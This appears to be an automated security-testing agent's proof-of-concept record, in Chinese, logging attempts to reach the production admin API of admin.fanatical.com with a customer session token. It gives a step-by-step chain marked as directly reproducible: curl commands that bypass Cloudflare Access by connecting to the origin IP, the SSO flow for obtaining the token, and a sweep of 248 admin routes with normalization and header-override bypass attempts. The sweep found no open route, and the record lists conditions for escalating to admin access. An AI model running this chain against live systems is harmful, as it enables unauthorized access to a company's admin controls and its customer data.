# fanatical 生产 admin 控制面接受生产顾客会话 token 但 248 条 /api/admin/* 与 bull-api 全 RBAC 拒绝（负面情报，别再重跑）

- **code**: fanatical-生产-admin-控制面接受生产顾客会话-token-但-248-条-api-admin-与
- **kind**: poc
- **category**: unauthorized
- **component**: Heroku fan-api-admin + AngularJS "amen" admin + CF Zero Trust Access
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-12 02:2x-02:5x UTC：--noproxy '*' --resolve admin.fanatical.com:443:13.248.131.213 + Host 直连摘除 CF Access，携生产同库顾客 token（经 apiprelive Fandom SSO 签发，role=customer）；/api/admin/users → 403 {"code":403,"error":"User not permitted to user:view","user":"6af51c16..."}（无认证时 401 User not authenticated）；解析 /dist/modules.e9712d78.js.map 得 248 条 /api/admin 路径、258 个 method 探测 → 244×403（79 个权限名）+ google-login 预认证端点 + 若干方法不符 404；/bull-api 13 种路径归一化变体全 403 misc:queues；同 token 打 adminstaging → 401（独立会话库），打生产 ws15 /api/user/orders → 200。
- **path**: pocs/fanatical-生产-admin-控制面接受生产顾客会话-token-但-248-条-api-admin-与/poc.txt
- **created_at**: 2026-11-12T02:35:59.306Z
- **engine**: https://admin.fanatical.com

## 用法

```
别在 admin.fanatical.com 重跑「顾客 token 越权测 admin API」——除非满足下面任一前提，否则 244 条路由恒 403：
1) 你已能写生产用户文档的 role/adminRoles/permissions（例如经 www /api/user/* mass assignment），使被接受的 token 直接具备 admin 权限；
2) 你已持有真实 admin Google 身份完成 /api/admin/google-login/set；
3) 你发现 SPA map 之外的 server-only 路由。
判据：401=认证层不接受（无效 token）；403+userid+权限名=接受但 RBAC 拒；200 JSON=缺口。投递形态：/api/admin/* 只认 Authorization 头（raw 或 Bearer 均可），Cookie AdminAuth/atok 等全 401；/bull-api/* 只认 Cookie AdminAuth。路径归一化（尾斜杠、大小写、%xx、//、/./）、X-Original-URL、X-HTTP-Method-Override、方法切换均不可绕。清单与权限表见 /opt/artex/data/tasks/5/i3618/sweep_prod2.tsv。
```

## 正文

```
验证链（可直接复刻）：
1) token 获取：GET https://apiprelive.fanatical.com/api/auth/fandom?redirectUrl=%2Fen%2Faccount%2Flogin&lang=en （--resolve apiprelive:443:3.33.161.45 + Host + X-Forwarded-Host + 唯一 XFF + UUID anonid）→ headful Chromium(Xvfb) 走 Fandom Hydra → 回跳 code+state → POST /api/auth/fandom/ body={code,state,snowplowId,snowplowSessionId,language} → 200 返回 token（同库且生产有效，见 finding#3610）。
2) 生产 admin 直连：curl -sk --noproxy '*' --resolve admin.fanatical.com:443:13.248.131.213 -H "Authorization: <token>" https://admin.fanatical.com/api/admin/users
3) 结果：403 {"code":403,"error":"User not permitted to user:view","user":"<userid>"}；无 token 401 {"code":401,"error":"User not authenticated"}；无效 token 401。
4) bull-board：curl ... -H "Cookie: AdminAuth=<token>" https://admin.fanatical.com/bull-api/api/queues → 403 misc:queues；无 cookie → 401 "Missing authorization cookie"。
5) 全量：从 /dist/modules.e9712d78.js.map 的 sourcesContent 提取 $http.get/post/put/delete/patch 里的 /api/admin/... 字面量（248 条），逐条按方法探测；本轮 244×403，未发现任何无权限校验端点。
6) 跨环境：同 token adminstaging(3.33.240.98) → 401；ws15(3.33.161.45, XFH:www) /api/user/orders → 200 []。

含义：生产 www 与生产 admin 共用同一顾客会话存储，认证边界为 0，唯一屏障是 admin 侧 RBAC；这不是可直接利用漏洞，但是「一旦拿到用户文档写入原语即可升级为 admin」的结构性前提。
```
